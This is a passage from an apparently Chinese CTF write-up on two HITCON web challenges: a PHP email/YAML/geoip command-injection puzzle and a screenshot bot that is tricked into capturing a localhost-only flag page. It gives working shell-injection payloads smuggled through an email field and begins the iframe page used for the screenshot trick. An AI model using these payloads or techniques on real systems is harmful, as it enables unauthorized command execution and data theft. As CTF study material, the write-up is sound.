<p><code>hitcon&#123;if your solution is l33t, please share it!&#125;</code></p>
<p>还有人修改了<code>wp-config.php</code>的数据库前缀，这样子的话WordPress会认为我们在进行一次新的安装，然后能够创建一个新的管理员账户</p>
<h2 id="W3rmup-PHP"><a href="#W3rmup-PHP" class="headerlink" title="W3rmup PHP"></a>W3rmup PHP</h2><p>这个题目非常的脑洞。。。在诸多神仙查看了无数底层源码之后，发现是一个脑洞题</p>
<p>先上源码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'mail'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$mail</span>    <span class="token operator">=</span> <span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'mail'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>           <span class="token constant">FILTER_VALIDATE_EMAIL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$addr</span>    <span class="token operator">=</span> <span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_IP</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$country</span> <span class="token operator">=</span> <span class="token function">geoip_country_code_by_name</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$addr</span>    <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span>    <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'bad addr'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$mail</span>    <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$mail</span><span class="token punctuation">)</span>    <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'bad mail'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$country</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$country</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'bad country'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$yaml</span> <span class="token operator">=</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span>
    <span class="token operator">-</span> <span class="token keyword">echo</span>          <span class="token shell-comment comment"># cmd</span>
    <span class="token operator">-</span> <span class="token variable">$addr</span>         <span class="token shell-comment comment"># address</span>
    <span class="token operator">-</span> <span class="token variable">$country</span>      <span class="token shell-comment comment"># country</span>
    <span class="token operator">-</span> <span class="token variable">$mail</span>         <span class="token shell-comment comment"># mail</span>
    <span class="token constant">EOF</span><span class="token punctuation">;</span>
    <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">yaml_parse</span><span class="token punctuation">(</span><span class="token variable">$yaml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$arr</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'bad yaml'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">system</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>接受一个邮箱，并使用了<code>filter_var</code>，<code>FILTER_VALIDATE_EMAIL</code>来检验邮箱的有效性，同时检验了一下REMOTE ADDR，并使用geoip库查询IP的所属地，以上述数据构造yaml，并解析，将解析结果escapshellarg，最后system执行</p>
<h3 id="参数逃逸"><a href="#参数逃逸" class="headerlink" title="参数逃逸"></a>参数逃逸</h3><p>这里yaml开头第一个数据是echo，加上后续的escapeshellarg，理论上是无法逃逸出一开始的echo的，难以执行其他命令，但是可以看到这里的逻辑</p>
<pre class=" language-php"><code class="language-php">    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>$i &lt; count($arr)，而unset($arr[$i])会导致数组长度缩小，这里for循环的循环轮数是由当前数组长度决定的，也就意味着，如果我们可以使某一个元素为空（或者false，0之类的值），其被unset，那么数组长度的缩小就导致末尾一个元素不会被转义，造成命令注入</p>
<h3 id="yaml逃逸"><a href="#yaml逃逸" class="headerlink" title="yaml逃逸"></a>yaml逃逸</h3><p>这个时候大伙都把注意力集中在了yaml的解析和PHP的FILTER_VALIDATE_EMAIL上，希望能整出来一个“合法”邮箱能同时过掉上述两个限制并执行命令</p>
<p>神仙们上来就是看源码，给我整不会了</p>
<blockquote>
<p>filter_var的相关函数：<a href="https://github.com/php/php-src/blob/aa733e8ac884db7c3d8fcde376074f2627668199/ext/filter/filter.c#L43">https://github.com/php/php-src/blob/aa733e8ac884db7c3d8fcde376074f2627668199/ext/filter/filter.c#L43</a><br><a href="https://github.com/php/php-src/blob/81b501f1ac91927566e9ec8630efe4dc9a821010/ext/filter/logical_filters.c">https://github.com/php/php-src/blob/81b501f1ac91927566e9ec8630efe4dc9a821010/ext/filter/logical_filters.c</a></p>
</blockquote>
<p>PHP关于email是写了两个正则进行匹配的，正则内容实在有点究极。。。看不下去</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">const</span> char regexp0<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/^(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?)){255,})(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?)){65,}@)(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E\\pL\\pN]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F\\pL\\pN]|(?:\\x5C[\\x00-\\x7F]))*\\x22))(?:\\.(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E\\pL\\pN]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F\\pL\\pN]|(?:\\x5C[\\x00-\\x7F]))*\\x22)))*@(?:(?:(?!.*[^.]{64,})(?:(?:(?:xn--)?[a-z0-9]+(?:-+[a-z0-9]+)*\\.){1,126}){1,}(?:(?:[a-z][a-z0-9]*)|(?:(?:xn--)[a-z0-9]+))(?:-+[a-z0-9]+)*)|(?:\\[(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7})|(?:(?!(?:.*[a-f0-9][:\\]]){7,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?)))|(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){5}:)|(?:(?!(?:.*[a-f0-9]:){5,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3}:)?)))?(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))(?:\\.(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))){3}))\\]))$/iDu"</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> char regexp1<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/^(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?)){255,})(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?)){65,}@)(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F]|(?:\\x5C[\\x00-\\x7F]))*\\x22))(?:\\.(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F]|(?:\\x5C[\\x00-\\x7F]))*\\x22)))*@(?:(?:(?!.*[^.]{64,})(?:(?:(?:xn--)?[a-z0-9]+(?:-+[a-z0-9]+)*\\.){1,126}){1,}(?:(?:[a-z][a-z0-9]*)|(?:(?:xn--)[a-z0-9]+))(?:-+[a-z0-9]+)*)|(?:\\[(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7})|(?:(?!(?:.*[a-f0-9][:\\]]){7,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?)))|(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){5}:)|(?:(?!(?:.*[a-f0-9]:){5,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3}:)?)))?(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))(?:\\.(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))){3}))\\]))$/iD"</span><span class="token punctuation">;</span>
</code></pre>
<p>简单测试之后发现，双引号包裹的内容允许输入一下比较非法的字符，也就是字母数字外的一些符号，但换行，空格等字符还需要在之前添加一个斜杠进行转义，也允许直接输入一些特殊符号，看情况而言（就是瞎测）</p>
<p>翻了下yaml的官方文档，提到yaml支持的换行符仅为<code>0x0a,0x0d</code>，在yaml 1.1版本下还支持<code>0x85,0x2028,0x2029</code>，zsx神仙去翻了libyaml源码实现，证实了libyaml是支持上述所有换行符的<br><a href="https://yaml.org/spec/1.2.2/#54-line-break-characters">yaml doc</a><br>但PHP的mail中似乎不允许出现非ascii字符？所以能用的换行符不过0d0a两个</p>
<p>虽然到此为止，我们能够在双引号中输出一些符号和空格换行，但空格和换行一定前面跟着一个斜杠，可以写出这样子的payload<br><code>a.&quot;\%0a-%23\%0a-;cmd;\%20%23&quot;.b@c.</code>，先过了mail check，得到对应的yaml</p>
<pre class=" language-yaml"><code class="language-yaml"><span class="token punctuation">-</span> echo          <span class="token comment" spellcheck="true"># cmd</span>
<span class="token punctuation">-</span> 153.3.60.137         <span class="token comment" spellcheck="true"># address</span>
<span class="token punctuation">-</span> CN      <span class="token comment" spellcheck="true"># country</span>
<span class="token punctuation">-</span> a."\
<span class="token punctuation">-</span><span class="token comment" spellcheck="true">#\</span>
<span class="token punctuation">-</span>;cmd;\ <span class="token comment" spellcheck="true">#".b@c.d         # mail</span>
</code></pre>
<p>最大的问题在于，缺空格，yaml的解析原则一定是<code>-</code>跟一个空格才能作为一个项，不然就出错，而libyaml支持的空格只有tab和%20，（zsx神仙看源码说的），没法用其他符号代替，而PHP的mail在使用空格时一定要加一个斜杠转义，似乎没有办法（引号闭不闭合都无所谓，这样子yaml会自行对引号和斜杠当成字符并进行转义）</p>
<h3 id="yaml的玄妙解析"><a href="#yaml的玄妙解析" class="headerlink" title="yaml的玄妙解析"></a>yaml的玄妙解析</h3><p>最后有一个神仙另辟蹊径，直接从上面的geoip处入手，直接遍历IP地址查看geoip可能输出的结果，并放进yaml中进行解析，看也没有机会为false，结果发现有一个国家的国家代码为NO（Norway），然后NO在yaml中直接解析为false？</p>
<p>还有这种事。。。这样子就不需要在mail层面进行逃逸了，直接上一个挪威的代理，使得geoip查出来一个NO，在yaml解析为false，直接逃逸出整个邮箱输入，然后再稍微构造一下整出来一个合法邮箱进行命令执行。。。</p>
<p>那么，挪威的代理从哪获取呢，zsx神仙提供了一个免费代理网站，里面有各种很破烂的线路，凑合着用吧<br><a href="http://free-proxy.cz/en/proxylist/country/NO/all/ping/all">free-proxy</a><br>挪威的代理类型均为http，我在burp的upstream proxy里面配了这个代理之后，并无吊用？不是很懂怎么使用的，但是在浏览器插件里面直接指定http代理的话， 又可以用，不是很理解。。。</p>
<p>但是好像有一对引号的情况下解析又会出现问题，分号不能用，不用引号也有一些符号是能用的，比如<code>|&amp;</code>，这两个都能逃逸出来命令执行，只要不出现在邮件的开头他们居然也被允许，并且试了一下，<code>$/</code>都能用，那就基本上随便执行命令了，列目录翻到根目录有readflag，成功打通<br><code>s|ls$&#123;IFS&#125;%2f||a@a.b</code>，<code>||</code>在Linux里面表示或来着，也是个常用操作，我都差不多忘了。。<br><code>hitcon&#123;H0w d0 U turn this ON? 4re U fr0m Norway?&#125;</code><br>复现成功（幸好交互过程不复杂，直接用浏览器插件挂代理也能打通）<br>oooooooooooh</p>
<h3 id="关于环境搭建的坑"><a href="#关于环境搭建的坑" class="headerlink" title="关于环境搭建的坑"></a>关于环境搭建的坑</h3><p>像geoip和yaml解析都不是PHP自带的，需要额外安装扩展，然后尝试以docker形式搭建环境，网上搜到的很多垃圾教程都说的是curl直接下源码下来本地编译。新时代人类无法接受这种旧时代操作，我就是要用包管理器下.jpg<br>这个样子</p>
<pre class=" language-bash"><code class="language-bash">apt <span class="token function">install</span> libyaml-dev -y <span class="token operator">&amp;&amp;</span> pecl <span class="token function">install</span> yaml
apt <span class="token function">install</span> geoip-dev -y <span class="token operator">&amp;&amp;</span> pecl <span class="token function">install</span> geoip
<span class="token keyword">echo</span> <span class="token string">"extension=yaml.so"</span> <span class="token operator">>></span> /usr/local/etc/php/php.ini
<span class="token keyword">echo</span> <span class="token string">"extension=geoip.so"</span> <span class="token operator">>></span> /usr/local/etc/php/php.ini
</code></pre>
<p>后来有人提出用apt能一键搞定，不过没试验过了</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> php-yaml
<span class="token function">apt-get</span> <span class="token function">install</span> php-geoip
</code></pre>
<p>然后翻CTFEVN这个模板的时候还发现了一种语法，同样未进行实验</p>
<pre><code>docker-php-ext-install -j$(nproc) &#123;ext_name&#125;
</code></pre>
<h2 id="Vulpixelize"><a href="#Vulpixelize" class="headerlink" title="Vulpixelize"></a>Vulpixelize</h2><p>这个题不是很难，我都还没来得及思考，吃了个饭回来就已经被神仙们秒杀了</p>
<p>功能也很简单</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding: UTF-8</span>
<span class="token keyword">import</span> io<span class="token punctuation">,</span> os<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> uuid

<span class="token keyword">from</span> subprocess <span class="token keyword">import</span> run<span class="token punctuation">,</span> PIPE
<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5

<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
<span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver<span class="token punctuation">,</span> common
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request

secret <span class="token operator">=</span> run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/read_secret'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">)</span><span class="token punctuation">.</span>stdout
FLAG   <span class="token operator">=</span> <span class="token string">'hitcon{%s}'</span> <span class="token operator">%</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>md5<span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">init_chrome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    options <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>ChromeOptions<span class="token punctuation">(</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--headless'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--disable-gpu'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--disable-dev-shm-usage'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--window-size=1920x1080'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_experimental_option<span class="token punctuation">(</span><span class="token string">"prefs"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        <span class="token string">'download.prompt_for_download'</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>
        <span class="token string">'download.default_directory'</span><span class="token punctuation">:</span> <span class="token string">'/dev/null'</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>

    driver <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span>options<span class="token operator">=</span>options<span class="token punctuation">)</span>
    driver<span class="token punctuation">.</span>set_page_load_timeout<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
    driver<span class="token punctuation">.</span>set_script_timeout<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> driver

<span class="token keyword">def</span> <span class="token function">message</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> msg<span class="token operator">=</span>msg<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">### initialize ###</span>
driver <span class="token operator">=</span> init_chrome<span class="token punctuation">(</span><span class="token punctuation">)</span>
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">### initialize ###</span>


@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>remote_addr <span class="token operator">==</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> message<span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span>
    <span class="token keyword">return</span> message<span class="token punctuation">(</span><span class="token string">"allow only from local"</span><span class="token punctuation">)</span>
    
@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/submit'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    path <span class="token operator">=</span> <span class="token string">'static/images/%s.png'</span> <span class="token operator">%</span> uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hex
    url  <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> url<span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true"># secrity check</span>
        <span class="token keyword">if</span> <span class="token operator">not</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'http://'</span><span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token operator">not</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'https://'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> message<span class="token punctuation">(</span>msg<span class="token operator">=</span><span class="token string">'malformed url'</span><span class="token punctuation">)</span>

        <span class="token comment" spellcheck="true"># access url</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
            data <span class="token operator">=</span> driver<span class="token punctuation">.</span>get_screenshot_as_png<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> common<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>WebDriverException <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">return</span> message<span class="token punctuation">(</span>msg<span class="token operator">=</span>str<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token comment" spellcheck="true"># save result</span>
        img <span class="token operator">=</span> Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
        img <span class="token operator">=</span> img<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">,</span> resample<span class="token operator">=</span>Image<span class="token punctuation">.</span>BILINEAR<span class="token punctuation">)</span>
        img <span class="token operator">=</span> img<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1920</span><span class="token punctuation">,</span><span class="token number">1080</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Image<span class="token punctuation">.</span>NEAREST<span class="token punctuation">)</span>
        img<span class="token punctuation">.</span>save<span class="token punctuation">(</span>path<span class="token punctuation">)</span>

        <span class="token keyword">return</span> message<span class="token punctuation">(</span>msg<span class="token operator">=</span>path<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> message<span class="token punctuation">(</span>msg<span class="token operator">=</span><span class="token string">"url not found :("</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">8000</span><span class="token punctuation">)</span>
</code></pre>
<p>就是允许你去访问一个页面，然后把那个页面截图下来，压缩到64x64的究极马赛克之后再扩大到一个正常图片，本地访问flag路由会返回flag，为了防止非预期flag是经典400然后有一个setUID readflag读取的<br>神仙们的思路是，在自己的vps上写一个iframe包含127.0.0.1的flag，然后把iframe超级放大，放大到字符变成64x64的马赛克也能看出来写的是什么，这样就能直接拿到flag</p>
<p>我也尝试着写了一下，不过由于我垃圾的前端技术，第一天晚上没写出来。。。</p>
<h3 id="构造iframe"><a href="#构造iframe" class="headerlink" title="构造iframe"></a>构造iframe</h3><p>首先很容易就能百度到一个叫<code>transform: scale();</code>的方法，用来等比例缩放iframe，但是这个方法有一个毛病，似乎是以iframe的中心为原点进行缩放的。。。flag的位置在窗口偏上的位置，这样子会导致放置flag的位置直接位于窗口之外。。并且滚动旁边的进度条也没法滚动到对应位置</p>
<p>然后就搜到了这个属性<code>transform-origin: 0 0;</code>，指定操作的原点，我直接指定为左上角，这样子是以左上角开始进行缩放的，整个iframe就都在屏幕显示范围内了<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/transform-origin">transform-origin</a><br><del>这里不得不说MDN的这个文档的效果做的比什么w3c、菜鸟教程好多了</del></p>
<p>但bot并不会拖动进度条到flag处再截图，并且放大的倍率要在超级马赛克下也能看懂文字，就一次只能获取到几位，还需要调整iframe的位置，让flag打开时就能被看见<br>于是稍微学习了一下CSS，一个HTML元素不仅仅只是一个元素，他除了自身的content，还由padding，border和margin组成，border就是元素的边界了，padding就是让元素是否直接和border紧靠，可以用padding让content和border有些距离<br>margin就是用来定义元素和元素之间的位置的，定义为正就是远离，定义为负就是重叠，我直接把margin-top和margin-left调成负数，把整个iframe往左上方移动，调节到这个数的时候刚好打开就能看到flag</p>
<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">
        <span class="token selector">iframe </span><span class="token punctuation">{</span>
            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">4000</span>px<span class="token punctuation">;</span>
            <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">2000</span>px<span class="token punctuation">;</span>
            <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">scale</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token property">transform-origin</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token property">margin-top</span><span class="token punctuation">:</span>-<span class="token number">3000</span>px<span class="token punctuation">;</span>
